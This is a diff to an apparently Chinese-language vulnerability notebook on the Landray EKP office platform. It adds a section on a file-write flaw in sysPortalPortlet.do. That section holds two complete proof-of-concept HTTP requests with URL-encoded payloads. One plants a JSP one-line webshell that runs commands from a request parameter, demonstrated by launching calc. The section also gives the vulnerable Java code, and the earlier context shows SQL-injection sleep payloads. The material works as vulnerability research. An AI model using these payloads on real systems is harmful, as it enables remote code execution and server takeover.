@@ -177,6 +177,7 @@ filterInvocationInterceptor中也定义了一些匿名路径
  - [5.XMLdecoder反序列化漏洞](#xmldecoder反序列化)
  - [6.debug.jsp写文件漏洞](#debug_jsp写文件)
  - [7.kmImeetingRes.do sql注入漏洞](#kmimeetingres_sql注入)
+ - [8.sysPortalPortlet.do Porlet文件写入漏洞](#sysPortalPortlet.do_Porlet文件写入漏洞)
 
 |漏洞名称|访问路径|漏洞定位|
 |:---:|:---:|:---:|
@@ -187,6 +188,7 @@ filterInvocationInterceptor中也定义了一些匿名路径
 |XMLdecoder反序列化漏洞|`/sys/search/sys_search_main/sysSearchMain.do?method=editParam`|`/util/ObjectXML.class`|
 |debug.jsp写文件漏洞|`/ekp/sys/common/debug.jsp`|直接将接收参数写入到了code.jsp|
 |kmImeetingRes.do sql注入漏洞|`/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do`|——|
+|sysPortalPortlet.do Porlet文件写入漏洞|`/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do`|——|
 
 ### custom文件读取
 custom.jsp文件内容如下
@@ -484,4 +486,91 @@ orderby参数注入的一些payload
 ```
 orderby=1 and (select 8320 from(select select(sleep(5)))JcSn)
 orderby=1;WAITFOR DELAY '0:0:5'--
+```
+
+### sysPortalPortlet.do Porlet文件写入漏洞
+
+访问路径为
+
+```
+/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=
+```
+
+此接口至少需要普通用户权限才可访问，它可根据`config`的配置内容，生成一个`jsp`文件，并将请求的内容转发至该`jsp`处理。
+
+下面这个Poc通过闭合标签`ui:tabpanel`的方式写入了自定义内容
+
+```http
+GET /ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%32%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d HTTP/1.1
+Host: 10.211.55.3:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
+DNT: 1
+Cookie: JSESSIONID=E0B865E92585A0FAC240CBC6B0D1EF22; LRToken=6bb730313adae9c8b3c73c57bb8397b53d5bda560086c31b09aa4c283b95b022bc4b3f59053eb885d9c728a642bbe67f4357cc445743389ad06cd3c4bda5a765f0c84412a4c97be120a07759493acf9e1445bfc6bbe165e77232695b41fbce97cb9234f72391c9533c2ba7e2c1754ee5ca1eb37fad5a17d05137ab76e153a3d2
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+If-Modified-Since: Fri, 09 Oct 2020 06:18:33 GMT
+Connection: close
+```
+
+其中config的内容如下
+
+```json
+{
+"panel":"tabpanel",
+"panelType":"h",
+"layoutId":"",
+"height":"1\"></ui:tabpanel>2<ui:tabpanel height=\"1",
+"layoutOpt":{},
+"portlet":[]
+}
+```
+
+或者写入一句话木马，并打开计算器。
+
+```http
+GET /ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%3c%25%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%69%5c%22%29%29%3b%25%3e%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d&i=calc HTTP/1.1
+Host: 10.211.55.3:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
+DNT: 1
+Cookie: JSESSIONID=2E84DEC027062EC4274B66A53ED10089; LRToken=5832b4e18cadebe86ce093937241a860d70fcee6768f0521376b94ee4113df46c8e4867ca509f2971b726b8ef179f972b7c695e9bd9f616d2842a8f9c8811a5108c5a9acb316c8760d1fa39d929b97a7c40651b9cb578ed809bd99f7b69350fda2ca9c1b12e4fce32d95bde575baa6a9c15c32f13d0a02972d16db7465b7b108
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+If-Modified-Since: Fri, 09 Oct 2020 06:18:33 GMT
+Connection: close
+```
+
+漏洞的利用只需构造满足`com.landray.kmss.sys.portal.util.DesignUtil#createPortlet`需求的数据即可。并通过闭合其它标签来写入自定义内容
+
+```java
+} else if (config.getString("panel").equalsIgnoreCase("tabpanel")) {
+    String panelType = config.getString("panelType");
+    if (panelType.equalsIgnoreCase("v")) {
+        in = new JspElement(Tag.valueOf("ui:accordionpanel"), "");
+    } else {
+        if (!panelType.equalsIgnoreCase("h")) {
+            throw new Exception("类型错误");
+        }
+
+        in = new JspElement(Tag.valueOf("ui:tabpanel"), "");
+        if (StringUtil.isNotNull((String)config.get("height"))) {
+            in.attr("height", config.getString("height"));
+        }
+
+        if (StringUtil.isNotNull((String)config.get("heightExt"))) {
+            if (config.getString("heightExt").equals("scroll")) {
+                in.attr("scroll", "true");
+            }
+
+            if (config.getString("heightExt").equals("auto")) {
+                in.attr("scroll", "false");
+            }
+        }
+    }
+```
+
+文件写入的路径是固定的，但文件名随机（日期加随机数）。
+```
+ekp/sys/portal/designer/page/20201020052353_17542bf489fff95ee5c04804b6b9a376.jsp
 ```
